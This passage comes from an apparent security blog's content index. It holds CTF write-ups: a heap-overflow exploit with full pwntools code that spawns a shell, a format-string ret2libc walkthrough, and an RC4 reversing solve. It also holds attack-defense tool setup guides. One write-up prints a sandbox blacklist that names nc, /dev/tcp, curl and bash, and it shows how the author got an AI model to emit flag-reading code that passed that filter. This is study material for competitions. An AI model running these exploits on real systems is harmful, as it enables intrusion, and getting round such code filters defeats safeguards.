decompiled code for x86_64bit binaries) and started to reverse the different functionalities of the program.\nADD From this function I understood 3 really important mechanics of the binary:\nWe can allocate max 15 chunks (the number of allocated chunks is saved in a global variable)\nEvery chunk we allocate is basically a \u0026ldquo;struct\u0026rdquo; (chunk of size 0x20) containing data size, a \u0026ldquo;is_used\u0026rdquo; flag and a pointer to a chunk containing the data itself.\n------------------------- | CHUNCK METADATA | ------------- ----------- | data_size | is_used | ------------- ----------- | data_chunck | | ------------------------- Structure of the chunk containing the \u0026ldquo;struct\u0026rdquo;\nEvery time a chunk is created the pointer to its \u0026ldquo;struct\u0026rdquo; is saved in a global array\nThe size of data can be max 199, so the bigger chunk we can allocate is 208 bytes big\nNOTE: Hereinafter I will use these words:\nstruct to talk about the \u0026ldquo;struct\u0026rdquo; explained above (chunk of size 0x20) chunk_num is the global variable containing the number of allocated chunks chunk_list is the global array containing the pointers to the structs is_used is the flag that determines if a chunk is free or allocated data_chunk is the chunk containing the data data_size is the number of bytes of data FREE This function might seem well implemented (it sets is_used to 0, frees data_chunk and removes its pointer from the relative struct and finally frees the struct itself). After a closer look I spotted the following issues:\nchunk_num is never decremented struct pointer is never removed from chunk_list (can lead to UAF) MODIFY This function holds the main vulnerability of the binary:\nread(0, data_chunk, 0x28); Basically you can write 40 bytes into the data chunk, but if the chunk is smaller than 0x28 we can overflow into the next chunk and manipulate its metadata.\nVIEW This simply prints the data of a chunk given its index in chunk_list. Note that it prints data_size bytes, so if we want to read more than our data we will need to tamper data_size field in struct.\nEXPLOITATION First steps First thing to do before even dreaming of exploiting this thing is getting the libc version, it can easily be copied from the docker image.\n$ docker pull ubuntu:22.04@sha256:a6d2b38300ce017add71440577d5b0a90460d0e57fd7aec21dd0d1b0761bbfb2 $ docker images REPOSITORY TAG IMAGE ID CREATED SIZE ubuntu \u0026lt;none\u0026gt; 52882761a72a 5 weeks ago 77.9MB $ docker cp \u0026#34;$(docker create 52882761a72a):/usr/lib/x86_64-linux-gnu/libc.so.6\u0026#34; \u0026#34;./\u0026#34; Successfully copied 6.47MB to ./ Then I patched the binary with:\n$ pwninit --bin=chall --libc=./libc.so.6 I also used checksec to find out that all the protections on the binary are enabled. :(\nLeaking stuff Knowing that we can mess with the metadata of a chunk just by modifying the chunk above, I overrode the size field of a chunk making it bigger, overlapping the chunks after it, this way I was able to leak heap and libc. The path I took was this:\nallocate three 0x20 chunks to be overflown later allocate six chunks of the maximum size allowed (0xd0), they will be overlapped by a big chunk of size 0x4f0 (which goes into unsortedbins when freed). free one of the 0xd0 chunks (the fd of this chunk will be used to leak the heap) overflow a 0x20 chunk to change the size of the chunk after it to make it bigger, overlapping all the chunks after. We also override the data_size of struct to be able to read after data_chunk. now, reading from this chunk would let us leak the fd of the freed chunk, from that we can calculate the heap address, bypassing safe linking with fd \u0026lt;\u0026lt; 12 . as the big chunk we created is of size 0x4f0 it will go into unsortedbins when freed and its fd will point to libc main arena. tampering the data_size of the chunk before the big chunk we can read the fd of the big chunk, leaking libc. As my final goal is to ROP on the stack we will also need to leak the stack, to do that we can exploit the UAF primitive to allocate a chunk over environ and read from it.\nUAF to spawn a shell Now that we leaked all we needed we can hopefully write a ROP chain on the stack and spawn a sheel. To do that I abused the UAF to allocate a chunk over the old_rbp on the stack, overriding it with a pointer to a well chosen location on the heap so as to have the perfect constraints for a onegadget. Finally I placed the onegadget over the retaddr on the stack and used option 5 (EXIT) to make the program return to the onegadget.\nNOTE: The choice of using a onegadget is due to the fact that we can only exploit the UAF on 0x20 chunks, so we have restricted space to write our ROP chain.\nProblems I faced Obviously the exploit didn\u0026rsquo;t work first try, the main problems I faced are the following:\ninitially I couldn\u0026rsquo;t free the big chunk because I allocated it over the top chunk and this caused a corruption to the top chunk\u0026rsquo;s metadata, making the binary crash. I spent a hell of a lot of time understanding why the free function was inserting into tcachebins two chunks at a time, that is obviously caused by the fact that an \u0026ldquo;allocated chunk\u0026rdquo; is composed of two chunks: struct and data_chunk. heap chunks must be aligned by 16 bytes (last 4 bits of the address must be set to 0), so we cannot allocate directly over the retaddr because it is not aligned. safe linking is enabled in the libc version used by the binary, so we need to calculate the correct pointer to put in fd, I used the following function: def calculate_P1(P, L): L12 = L \u0026gt;\u0026gt; 12 P = P.to_bytes(8, \u0026#34;big\u0026#34;) L12 = L12.to_bytes(8, \u0026#34;big\u0026#34;) return int(bytes([p^l12 for p,l12 in zip(P,L12)]).hex(), 16) Final Exploit #!/usr/bin/env python3 from pwn import * exe = ELF(\u0026#34;chall_patched\u0026#34;) libc = ELF(\u0026#34;libc.so.6\u0026#34;) ld = ELF(\u0026#34;./ld-2.35.so\u0026#34;) context.binary = exe context.terminal = [\u0026#34;alacritty\u0026#34;, \u0026#34;-e\u0026#34;] def conn(): if args.LOCAL: r = process([exe.path]) elif args.GDB: r = gdb.debug([exe.path]) else: r = remote(\u0026#34;13.125.233.58\u0026#34;, 7331) return r r = conn() def get_heap_base(Pprime): Pprime_byte = 0 xor_byte = 0 decoded = Pprime \u0026gt;\u0026gt; 36 for i in range(3): Pprime_byte = Pprime \u0026gt;\u0026gt; (28 - i*8) xor_byte = Pprime_byte ^ (decoded \u0026gt;\u0026gt; 4) decoded = decoded \u0026lt;\u0026lt; 8 decoded |= xor_byte return decoded \u0026lt;\u0026lt; 12 def calculate_P1(P, L): L12 = L \u0026gt;\u0026gt; 12 P = P.to_bytes(8, \u0026#34;big\u0026#34;) L12 = L12.to_bytes(8, \u0026#34;big\u0026#34;) return int(bytes([p^l12 for p,l12 in zip(P,L12)]).hex(), 16) def add(size, data): r.sendlineafter(b\u0026#34;\u0026gt;\u0026gt;\u0026#34;, b\u0026#34;1\u0026#34;) r.sendlineafter(b\u0026#34;:\u0026#34;, str(size).encode()) r.sendafter(b\u0026#34;:\u0026#34;, data) def free(idx): r.sendlineafter(b\u0026#34;\u0026gt;\u0026gt;\u0026#34;, b\u0026#34;2\u0026#34;) r.sendlineafter(b\u0026#34;:\u0026#34;, str(idx).encode()) def modify(idx, data): assert len(data) \u0026lt;= 40 r.sendlineafter(b\u0026#34;\u0026gt;\u0026gt;\u0026#34;, b\u0026#34;3\u0026#34;) r.sendlineafter(b\u0026#34;:\u0026#34;, str(idx).encode()) r.sendafter(b\u0026#34;:\u0026#34;, data) def view(idx): r.sendlineafter(b\u0026#34;\u0026gt;\u0026gt;\u0026#34;, b\u0026#34;4\u0026#34;) r.sendlineafter(b\u0026#34;:\u0026#34;, str(idx).encode()) return r.recvuntil(b\u0026#34;1. add\u0026#34;)[1:-6] def main(): add(16, b\u0026#34;a\u0026#34;*16) add(16, b\u0026#34;b\u0026#34;*16) add(16, b\u0026#34;c\u0026#34;*16) for _ in range(6): add(199, b\u0026#34;x\u0026#34;*199) free(3) # chunk for heap leak # leak libc and heap abusing chunk overlapping and unsortedbins payload = b\u0026#34;c\u0026#34;*16 + b\u0026#34;\\x00\u0026#34;*8 + p64(0x4f1) + p64(40) modify(1, payload) heap = u64(view(2)[-8:]) \u0026lt;\u0026lt; 12 log.warning(f\u0026#34;heap: {hex(heap)}\u0026#34;) free(2) # free big chunk into unsortedbins payload = b\u0026#34;b\u0026#34;*16 + b\u0026#34;\\x00\u0026#34;*8 + p64(0x21) + p64(40) modify(0, payload) libc.address = u64(view(1)[-8:]) - (libc.sym[\u0026#34;main_arena\u0026#34;] + 96) log.warning(f\u0026#34;libc: {hex(libc.address)}\u0026#34;) payload = b\u0026#34;c\u0026#34;*16 + b\u0026#34;\\x00\u0026#34;*8 + p64(0x21) + p64(16) modify(0, payload) # leak stack (environ) payload = b\u0026#34;b\u0026#34;*16 + b\u0026#34;\\x00\u0026#34;*8 + p64(0x81) + p64(32) modify(4, payload) free(4) payload = p64(0x10) + p64(1) + p64(libc.sym[\u0026#34;environ\u0026#34;]) add(120, payload) retaddr = u64(view(2)[:8]) - 0x120 log.warning(f\u0026#34;stack: {hex(retaddr)}\u0026#34;) free(9) # ROP on the stack payload = ( b\u0026#34;y\u0026#34;*16 + p64(0) + p64(0x61) + p64(calculate_P1(retaddr-8, heap+0x378)) + p64(heap+0x388) + # goes in rbp (tweak for onegadet) p64(heap+0x390) + p64(0)*2 ) add(120, payload) ONE_GADGET = libc.address + 0xebd3f rbp = p64(heap+0x380) retaddr = p64(ONE_GADGET) add(16, rbp + retaddr) r.sendlineafter(b\u0026#34;\u0026gt;\u0026gt;\u0026#34;, b\u0026#34;5\u0026#34;) # exit to trigger onegadget r.interactive() if __name__ == \u0026#34;__main__\u0026#34;: main() FLAG: codegate2024{f0de50c65021e07779d3cde7576c4fbe519e6412ad7de1ee743abd08b5b435844184c2295ff705f54b55790a454c427b8faf1d65bbf1f4e19df0c5613d36b0}\n","permalink":"http://leo1.cc/posts/writeups/codegatejunior24-baby_heap/","summary":"Heap challenge from the Codegate quals for juniors of 2024. The vulnerability was an heap overflow that enabled an attacker to gain overlapping chunks, therefore arb read and write.","title":"CodegateJunior24 - Baby Heap"},{"content":"CHALLENGE OVERVIEW This challenge is basically a python sandbox, but rather than executing our input, it executes the output given from an AI model. We can ask the AI to write some code and that code is then filtered with the following blacklist and executed.\nblacklist = [ \u0026#34;cat\u0026#34;, \u0026#34;grep\u0026#34;, \u0026#34;nano\u0026#34;, \u0026#34;subprocess\u0026#34;, \u0026#34;input\u0026#34;, \u0026#34;sys\u0026#34;, \u0026#34;execfile\u0026#34;, \u0026#34;builtins\u0026#34;, \u0026#34;dict\u0026#34;, \u0026#34;for\u0026#34;, \u0026#34;dir\u0026#34;, \u0026#34;file\u0026#34;, \u0026#34;input\u0026#34;, \u0026#34;write\u0026#34;, \u0026#34;while\u0026#34;, \u0026#34;print\u0026#34;, \u0026#34;int\u0026#34;, \u0026#34;nc\u0026#34;, \u0026#34;/dev/tcp/\u0026#34;, \u0026#34;socket\u0026#34;, \u0026#34;TCPSocket\u0026#34;, \u0026#34;curl\u0026#34;, \u0026#34;wget\u0026#34;, \u0026#34;request\u0026#34;, \u0026#34;-display\u0026#34;, \u0026#34;xhost\u0026#34;, \u0026#34;bash\u0026#34;, \u0026#34;sh\u0026#34;, \u0026#34;\u0026lt;\u0026#34;, \u0026#34;\u0026gt;\u0026#34; ] The challenge also implements a POW to prevent us from spamming too much to the AI (I think). The POW can be solved bruteforcing 4 characters:\nfrom pwn import * import string import hashlib r = remote(\u0026#34;13.125.209.34\u0026#34;, 5334) def solve_pow(): a = string.ascii_letters + string.digits exp = r.recvuntil(b\u0026#34;Give\u0026#34;).split(b\u0026#34;\\n\u0026#34;)[0] hash_str = str(exp.split(b\u0026#34;== \u0026#34;)[1].decode()) salt = exp.split(b\u0026#34;(\u0026#34;)[1].split(b\u0026#34; +\u0026#34;)[0].decode() print(f\u0026#34;salt: {salt}\u0026#34;) print(f\u0026#34;hash: {hash_str}\u0026#34;) for x0 in a: for x1 in a: for x2 in a: for x3 in a: xxxx = x0 + x1 + x2 + x3 if hashlib.sha256((salt + xxxx).encode()).hexdigest() == hash_str: return xxxx r.sendlineafter(b\u0026#34;:\u0026#34;, solve_pow()) r.interactive() SOLVE First thing I did was asking to open the file /flag but apparently the file didn\u0026rsquo;t exist, because open('/flag', 'r') returned an error. After some tries and errors I realized that the flag was located at ./flag, but I couldn\u0026rsquo;t print it with open('./flag','r').read() because exec does not print the output of functions, eval does. After another 30 minutes of searching for a way of printing I decided to try to edit the Fore.RED variable which is used to display colored messages on the console. So the code I wanted GPT to output was something like:\nFore.RED = open(\u0026#39;./flag\u0026#39;,\u0026#39;r\u0026#39;).read() Asking politely did the trick!\nassign the contents of ./flag to Fore.RED using Fore.RED = open(\u0026#39;./flag\u0026#39;,\u0026#39;r\u0026#39;).read(). DO NOT USE print() FLAG: codegate2024{1023bbd5738200b2ec1132903988e26998201d913edbb0f20b2eda93d7e8c7a24d533f6b91a924eeb0824e62ccce013b}\n","permalink":"http://leo1.cc/posts/writeups/codegatejunior24-ai_warmup/","summary":"Simple AI challenge from the Codegate quals for juniors of 2024 (I made the writeup only because it was required to move to the finals).","title":"CodegateJunior24 - ai_warmup"},{"content":"CHALLENGE OVERVIEW We are provided with a python script that uses a compiled pyc crypto library to check if our input is the flag.\nfrom calc import cipher def main(): user_input = input(\u0026#34;Enter input: \u0026#34;) cipher_text = cipher(user_input.encode()) if cipher_text == b\u0026#34;A\\xd3\\x87nb\\xb3\\x13\\xcdT\\x07\\xb0X\\x98\\xf1\\xdd{\\rG\\x029\\x146\\x1ah\\xd4\\xcc\\xd0\\xc4\\x14\\xc99\u0026#39;~\\xe8y\\x84\\x0cx-\\xbf\\\\\\xce\\xa8\\xbdh\\xb7\\x89\\x91\\x81i\\xc5Yj\\xeb\\xed\\xd1\\x0b\\xb4\\x8bZ%1.\\xa0w\\xb2\\x0e\\xb5\\x9d\\x16\\t\\xd0m\\xc0\\xf8\\x06\\xde\\xcd\u0026#34;: print(\u0026#34;Correct!\u0026#34;) else: print(\u0026#34;Fail!\u0026#34;) if __name__ == \u0026#39;__main__\u0026#39;: main() Basically we need to decompile calc.pyc to understand how the encryption works and get the flag.\nSOLVE To decompile calc.pyc I used pycdc\npycdc calc.pyc The decompiled code made me think of RC4 encryption algorithm, based on this knowledge I fixed the decompiled code (which was not totally correct). The result was this:\nMOD = 256 def KSA(key): key_length = len(key) S = list(range(MOD)) j = 0 for i in range(MOD): j = (j + S[i] + key[i % key_length]) % MOD S[i], S[j] = S[j], S[i] return S def PRGA(S): i = 0 j = 0 while True: i = (i + 1) % MOD j = (j + S[i]) % MOD S[i], S[j] = S[j], S[i] K = S[(S[i] + S[j]) % MOD] yield K def get_keystream(key): S = KSA(key) return PRGA(S) def cipher(text): key = \u0026#39;neMphDuJDhr19Bb\u0026#39; key = (lambda a: [ ord(c) ^ 48 for c in a ])(key) keystream = get_keystream(key) text = text[-2:] + text[:-2] res = [] for c in text: val = c ^ next(keystream) res.append(val) return bytes(res) calc.py\nAs you can see the key is known so we just need to write a function to decrypt the known ciphertext with the known key. This is a good task for chatGPT!\nMOD = 256 def KSA(key): key_length = len(key) S = list(range(MOD)) j = 0 for i in range(MOD): j = (j + S[i] + key[i % key_length]) % MOD S[i], S[j] = S[j], S[i] return S def PRGA(S): i = 0 j = 0 while True: i = (i + 1) % MOD j = (j + S[i]) % MOD S[i], S[j] = S[j], S[i] K = S[(S[i] + S[j]) % MOD] yield K def get_keystream(key): S = KSA(key) return PRGA(S) def decipher(ciphertext): key = \u0026#39;neMphDuJDhr19Bb\u0026#39; key = (lambda a: [ ord(c) ^ 48 for c in a ])(key) keystream = get_keystream(key) decrypted = [] for c in ciphertext: val = c ^ next(keystream) decrypted.append(val) return bytes(decrypted) ciphertext = b\u0026#34;A\\xd3\\x87nb\\xb3\\x13\\xcdT\\x07\\xb0X\\x98\\xf1\\xdd{\\rG\\x029\\x146\\x1ah\\xd4\\xcc\\xd0\\xc4\\x14\\xc99\u0026#39;~\\xe8y\\x84\\x0cx-\\xbf\\\\\\xce\\xa8\\xbdh\\xb7\\x89\\x91\\x81i\\xc5Yj\\xeb\\xed\\xd1\\x0b\\xb4\\x8bZ%1.\\xa0w\\xb2\\x0e\\xb5\\x9d\\x16\\t\\xd0m\\xc0\\xf8\\x06\\xde\\xcd\u0026#34; plaintext = decipher(ciphertext) flag = (plaintext[2:] + plaintext[:2]).decode() print(flag) FLAG: codegate2024{da5d6bd71ff39f66b8b7200a92b0116b4f8e5e27d25d6119e63d3266bd4c8508}\n","permalink":"http://leo1.cc/posts/writeups/codegatejunior24-easy_reversing/","summary":"Intresting python-compiled (pyc) reverse-engineering challenge from the Codegate quals for juniors of 2024.","title":"CodegateJunior24 - easy_reversing"},{"content":"CHALLENGE DESCRIPTION Logging data from your application is very important. This is why we are logging ABSOLUTELY EVERYTHING in this small calculator app.\nnc log4x86.challs.open.ecsc2024.it 38019\nTABLE OF CONTENTS BINARY OVERVIEW REVERSE ENGINEERING EXPLOITATION First steps Initial ideas Bypassing the whitelist Arbitrary write and ret2libc SUMMARY FINAL THOUGHTS BINARY OVERVIEW Log4x86 is an x86 64 bit binary which consists in a simple calculator app wrapped with basic logging functionalities, such as:\nchanging log level changing log format resetting log format Reading the decompiled code we can easily notice the intense use of printf and snprinf, which might be vulnerable to format string attacks.\nREVERSE ENGINEERING Decompiling the binary with Ida we can get a pretty neat main function. It\u0026rsquo;s basically a while loop which gets our input with a well implemented fgets, then it parses it with the following instruction:\n__isoc99_sscanf(command, \u0026#34;%63s %31s %31s %31s\u0026#34;, cmd, arg1, arg2, arg3); Then we have a series of if statements that call different functions according to the command we inputted. Each command is logged to stdout with the following code:\nif (GLOBAL_LOG_LEVEL \u0026lt;= 1 ) { if ( OLD_LOG != 999 ) { logLevel = logLevelResolver(1u, \u0026#34;reset_log_format\u0026#34;); sprintf( log_msg_base, LOG_FORMAT, logLevel, \u0026#34;logloglog.c\u0026#34;, 999LL, \u0026#34;Reset log format to: \u0026#39;%s\u0026#39;\u0026#34; ); OLD_LOG = 999; } printf(log_msg_base, LOG_FORMAT); } This basically writes a log message with the format string specified by LOG_FORMAT but, as I specified earlier, changing LOG_FORMAT is a functionality provided by the program itself so we could ideally inject a format-string exploit into it and then trigger it with the next snprintf. Fortunately or unfortunately (choice to you), this is not that easy, there are some checks and constraints to bypass:\nThe new LOG_FORMAT can be max 10 char long (including the NULL byte) LOG_FORMAT cannot contain $ and * There is also a regex check, but we don\u0026rsquo;t really care about it Another great thing to notice is that log_msg_base is changed only the first time a specific log is triggered. In short, if we trigger the same command multiple times in a row, only the first time log_msg_base will change. Keep this in mind, it will come in useful.\nEXPLOITATION First steps First thing I like to do before pwning is running pwninit to patch the binary with the correct version of libc and create a Pwntools template script.\nTo get the correct libc version used by the remote we can pull the docker image specified in docker-compose.yml and then extract libc.so.6 from it.\n$ docker pull cybersecnatlab/challenge-jail@sha256:7bf77225063b039960f654307cf5d6f977f892ff548606357a2e8fe8067d0a88 REPOSITORY TAG IMAGE ID CREATED SIZE cybersecnatlab/challenge-jail \u0026lt;none\u0026gt; 02becdec589e 8 months ago 139MB $ docker cp \u0026#34;$(docker create 02becdec589e):/usr/lib/x86_64-linux-gnu/libc.so.6\u0026#34; \u0026#34;./\u0026#34; Successfully copied 2.22MB to ./ Then run pwninit with\n$ pwninit --bin=logloglog --libc=./libc.so.6 Another good practice is to run checksec on the binary\n$ checksec --file=logloglog_patched RELRO STACK CANARY NX PIE Partial RELRO Canary found NX enabled PIE enabled Mhhh, Partial RELRO\u0026hellip; GOT override might be possible.\nInitial ideas After finding the format string I tried some basic payloads like %pand leaked ASLR base address, but I couldn\u0026rsquo;t do anything more seeing that I had only 9 chars to write my payload.\nMessing around with the payload I figured out that we could trigger a sort of \u0026ldquo;second-order\u0026rdquo; format string attack by setting the log format to something like %%p. This transforms into a %p after the sprintf and then is used by printf, with this technique I leaked the stack.\n$ ./logloglog_patched \u0026gt; change_log_format %%p [DBG-logloglog.c:103] Successfully read some bytes 0x597c3dd200f0 \u0026gt; aaaaaaa 0x7ffeaa48a0e0 Spoiler: this won\u0026rsquo;t be really useful :(\nAs we cannot use $ we can only interact with the first 3 parameters of printf, which are contained respectively in rsi, rdx and rcx. I inspected these register before every call to printf and sadly found out that there are no useful pointers to tamper in there.\nBypassing the whitelist After another few ours of trying random stuff and thinking hard I noticed that the log_msg_base global variable (which is the string where sprintf writes) is right on top of the command global variable (which contains our input taken by fgets), so changing the log format to %256c would cause log_msg_base to overflow into command, the next command will then override the terminator NULL byte of log_msg_base, causing it to be longer than 9 chars and bypass the whitelist.\nMemory after %256c:\n0x555555558120 \u0026lt;log_msg_base\u0026gt;:\t0x2020202020202020\t0x2020202020202020 0x555555558130 \u0026lt;log_msg_base+16\u0026gt;:\t0x2020202020202020\t0x2020202020202020 0x555555558140 \u0026lt;log_msg_base+32\u0026gt;:\t0x2020202020202020\t0x2020202020202020 0x555555558150 \u0026lt;log_msg_base+48\u0026gt;:\t0x2020202020202020\t0x2020202020202020 0x555555558160 \u0026lt;log_msg_base+64\u0026gt;:\t0x2020202020202020\t0x2020202020202020 0x555555558170 \u0026lt;log_msg_base+80\u0026gt;:\t0x2020202020202020\t0x2020202020202020 0x555555558180 \u0026lt;log_msg_base+96\u0026gt;:\t0x2020202020202020\t0x2020202020202020 0x555555558190 \u0026lt;log_msg_base+112\u0026gt;:\t0x2020202020202020\t0x2020202020202020 0x5555555581a0 \u0026lt;log_msg_base+128\u0026gt;:\t0x2020202020202020\t0x2020202020202020 0x5555555581b0 \u0026lt;log_msg_base+144\u0026gt;:\t0x2020202020202020\t0x2020202020202020 0x5555555581c0 \u0026lt;log_msg_base+160\u0026gt;:\t0x2020202020202020\t0x2020202020202020 0x5555555581d0 \u0026lt;log_msg_base+176\u0026gt;:\t0x2020202020202020\t0x2020202020202020 0x5555555581e0 \u0026lt;log_msg_base+192\u0026gt;:\t0x2020202020202020\t0x2020202020202020 0x5555555581f0 \u0026lt;log_msg_base+208\u0026gt;:\t0x2020202020202020\t0x2020202020202020 0x555555558200 \u0026lt;log_msg_base+224\u0026gt;:\t0x2020202020202020\t0x2020202020202020 0x555555558210 \u0026lt;log_msg_base+240\u0026gt;:\t0x2020202020202020\t0x1c20202020202020 0x555555558220 \u0026lt;command\u0026gt;:\t0x6c5f65676e61000a\t0x616d726f665f676f From here it\u0026rsquo;s all straight forward, we can write a format string as a command, thus overriding the NULL byte of log_msg_base (effectively enlarging log_msg_base itself). When printf(log_msg_base) is called it will trigger our format string which, at this point, has only one constraint: it can contain only one pointer (because the string ends with a NULL byte).\nArbitrary write and ret2libc Now we can leak libc and think about how to achieve ACE. My first idea was to override something on the GOT with a onegadget, but I didn\u0026rsquo;t manage to find a GOT entry that satisfied the constraints of any onegadget. This was not a great moment, because I realized that I had to create a ROP chain on the stack with format strings. After a good half-an-hour of pain I managed to ret2libc and flagged!\nIN SUMMARY Overflow log_msg_base into command with %256c Override log_msg_base\u0026rsquo;s NULL byte with the next command, enlarging log_msg_base (our format string). Next commands will be appended to log_msg_base. Leak libc with %37$p Take a deep breath Write a ret2libc payload on the stack with the format string (one pointer per command due to NULL bytes) FINAL THOUGHTS This was a really painful fun challenge where I learned more about printf and buffer overflows through format string attacks.\n","permalink":"http://leo1.cc/posts/writeups/openecscr3-log4x86/","summary":"This challenge comes from the 3rd round of openECSC 2024. The challenge was really really interesting: the exploitation tecnique involved a buffer overflow through a really short format string vulnerability.","title":"OpenECSC Round 3 - Log4x86"},{"content":"Setup the submitter (server) The submitter is the tool that collects flags from farm clients, sends them to the checksystem, monitors the usage of quotas and shows the stats about the accepted and rejected flags. It is being configured and run by the team\u0026rsquo;s admin at the start of the competition. After that, team members can use a web interface to watch the exploits\u0026rsquo; results and stats.\nClone the repo on a local server or on a dedicated VPS and enter the server direcrory\n$ git clone https://github.com/DestructiveVoice/DestructiveFarm $ cd DestructiveFarm/server/ Submitter general configuration Edit config.py according to the rules of your specific competition\nTEAMS ip addresses of all the teams (generated using a format string) FLAG_FORMAT the regex the server will use to identify the flags in the traffic generated by the exploits SUBMIT_FLAG_LIMIT max number of flag the server will try to send in a SUBMIT_PERIOD FLAG_LIFETIME flags older than this period, not yet sent, will be discarded SERVER_PASSWORD password to access the front-end control page of the submitter . SYSTEM_PROTOCOL the name of your protocol (see Protocols) SYSTEM_HOST IP address of the flag checker (only for TCP protocols) SYSTEM_URL URL of the flag checker (only for HTTP protocols) SYSTEM_PORT port number used by the flag checker for incoming traffic SYSTEM_TOKEN authentication token (only for HTTP protocols) Protocols A protocol defines the interaction standard between the submitter and the flag checker hosted by the competition host. It is specific to the competition and it is usually explicitly outlined in the rules.\nThe comunication protocols usually are either based on a HTTP session or a simple TCP connection. The folder protocols/ already contains 4 examples of both cases pulled from real competitions. You need to make one specific for your competition.\nRegardless of the type of the connection, first you need to map all the possible server response to a FlagStatus.\nRESPONSES = { FlagStatus.QUEUED: [\u0026#39;timeout\u0026#39;, \u0026#39;game not started\u0026#39;, \u0026#39;try again later\u0026#39;,\u0026#39;game over\u0026#39;, \u0026#39;is not up\u0026#39;, \u0026#39;no such flag\u0026#39;], FlagStatus.ACCEPTED: [\u0026#39;accepted\u0026#39;, \u0026#39;congrat\u0026#39;], FlagStatus.REJECTED: [\u0026#39;bad\u0026#39;, \u0026#39;wrong\u0026#39;, \u0026#39;expired\u0026#39;, \u0026#39;unknown\u0026#39;, \u0026#39;your own\u0026#39;, \u0026#39;too old\u0026#39;, \u0026#39;not in database\u0026#39;, \u0026#39;already submitted\u0026#39;,\u0026#39;invalid flag\u0026#39;], } After that, the submit_flags(flags, config) function must be configured to craft a request to the checker for each flag present in the flags parameter, listen for a response by the server and update the staus of each flag based on the RESPONSES defined before.\nDestructive Farm will invoke your function whenever its needed.\nHINT: Most protocols are very similar, copy one of the examples and adapt it to your competition\nRunning the submitter Once everything is set up you can run the server by running:\n$ ./start_server.sh This script can be edited to change the port used by the service by addding --port=1234. By default Flask will use port 5000\nDestructiveFarm maintains persistence in the file flags.sqlite. Deleting the file will result in the removal of all flags collected up to this point.\nSetup the farm client A farm client is a tool that periodically runs the exploit to attack other teams and looks after their work. It can be run by each participant on their laptop after they\u0026rsquo;ve written an exploit.\nClone the same repo on the client that will run the exploit and enter the client folder\n$ git clone https://github.com/DestructiveVoice/DestructiveFarm $ cd DestructiveFarm/client/ The exploit The exploit is a script that steals flags from some service of other teams. It is written by a participant during the competition and should accept the victim\u0026rsquo;s host (IP address or domain) as the first command-line argument, attack them and print flags to stdout.\nThe first argument can be retrieved with sys.argv[1]\nYou should find an example called spl_example.py from where you can start to build your own.\nThe client The client will be in constant comunication with the server and it will periodically run the exploit providing the address of the victim. The frequency and number of invocations depends on the server configuration shown here.\nThe only 2 parameters required by the client are the name of the expoit and the address of the submitter server (the same address and port you use to reach the front-end)\n./start_sploit.py my_exploit.py -u serverAddress.com:5000 The system will automatically extract the flags from your exploit\u0026rsquo;s output based on the FLAG_FORMAT you provided here and send them to the server.\nThe server will automatically detect duplicates and it will try to submit the flags in multiple occasions until either the state of the flag becomes ACCEPTED or the lifetime of the flag is exceeded.\n","permalink":"http://leo1.cc/posts/docs/destructivefarm_setup/","summary":"DestructiveFarm is a popular tool used in CTFs and what it does is running exploits every tick to retrieve flags and automatically submit them to the checker.","title":"DestructiveFarm setup for A/D CTFs"},{"content":"Setup tulip on the VM Tulip specific configurations Clone the repo\n$ git clone https://github.com/OpenAttackDefenseTools/tulip.git $ cd tulip Edit services/api/configurations.py with the correct tick_length, start_date, vm_ip, and the services\n$ cp .env.example .env edit .env with the correct FLAG_REGEX, TICK_START, TICK_LENGTH and change TRAFFIC_DIR_HOST to point to the correct folder containing the pcaps (in our case /ready_pcaps)\nIf you want tulip to listen on a different port (e.g. port 4444) edit docker-compose.yml and under the frontend service change\nports: - \u0026#34;3000:3000\u0026#34; to\nports: - \u0026#34;4444:3000\u0026#34; WARNING: (if you host tulip on the vulnbox and don\u0026rsquo;t change the web interface port you risk other teams to steal flags throght tulip. Yep, they know tulip default port is 3000)\n$ docker compose up -d --build Tulip is now running.\nPacket capturing Save these scripts:\n/create-pcap.sh\n#!/bin/sh # -i game : game is the wireguard network interface, change it as needed mkdir -p /pcaps mkdir -p /ready_pcaps chmod 777 /pcaps chmod 777 /ready_pcaps tcpdump -G 120 -w /pcaps/myfile-%Y-%m-%d_%H.%M.%S.pcap -i game -z \u0026#39;/post-rotate.sh\u0026#39; port not 22 /post-rotate.sh\n#!/bin/sh mkdir -p /ready_pcaps/ mv $1 /ready_pcaps/ Then disable the apparmor profile for tcpdump\n$ apt install apparmor-utils $ aa-complain /usr/bin/tcpdump Now in a tmux or screen:\n$ chmod +x /create-pcap.sh $ chmod +x /post-rotate.sh $ /create-pcap.sh While create-pcap.sh is running, ready_pcaps will be populated with the network pcaps and Tulip will show them on the web interface.s\nSetup Tulip on a dedicated VPS On the vps Clone the repo\n$ git clone https://github.com/OpenAttackDefenseTools/tulip.git $ cd tulip Edit services/api/configurations.py with the correct tick_length, start_date, vm_ip, and the services\n$ cp .env.example .env edit .env with the correct FLAG_REGEX, TICK_START and TICK_LENGTH\nIf you want tulip to only listen on localhost:3000 instead of 0.0.0.0:3000, then edit docker-compose.yml and under the frontend service change\nports: - \u0026#34;3000:3000\u0026#34; to\nports: - \u0026#34;127.0.0.1:3000:3000\u0026#34; $ docker compose up -d --build Tulip is now running.\nOn the vulnbox Save these scripts:\n/create-pcap.sh\n#!/bin/sh # -i game : game is the wireguard network interface, change it as needed mkdir -p /pcaps mkdir -p /ready_pcaps chmod 777 /pcaps chmod 777 /ready_pcaps tcpdump -G 120 -w /pcaps/myfile-%Y-%m-%d_%H.%M.%S.pcap -i game -z \u0026#39;/post-rotate.sh\u0026#39; port not 22 /post-rotate.sh\n#!/bin/sh mkdir -p /ready_pcaps/ mv $1 /ready_pcaps/ Then disable the apparmor profile for tcpdump\n$ apt install apparmor-utils $ aa-complain /usr/bin/tcpdump Now in a tmux or screen:\n$ chmod +x /create-pcap.sh $ chmod +x /post-rotate.sh $ /create-pcap.sh While create-pcap.sh is running, ready_pcaps will be populated with the network pcaps.\nSend pcaps to tulip The last thing is to send the pcaps to tulip, there are two ways to do it :\n1: The vps has ssh access to the vulnbox, and can scp the pcaps 2: The vps is not in the vpn, so no access to the vulnbox. In this case the vulnbox will have ssh access to the vps (this could be hardened) Case 1: First create an ssh key in the vps and add it in the vulbox.\nThen, on the vps save the script take-pcap.sh:\n#!/usr/bin/bash IP_VULNBOX=10.32.55.2 while true do rsync -avz --remove-source-files root@$IP_VULNBOX:/ready_pcaps/* CHANGE_ME_TRAFFIC_DIR_HOST sleep 10 # tweak this as you like done Now open a tmux and run this script, tulip will receive the pcaps.\nCase 2: First create an ssh key in the vulnbox and add it in the vps.\nThen, on the vulnbox save the script 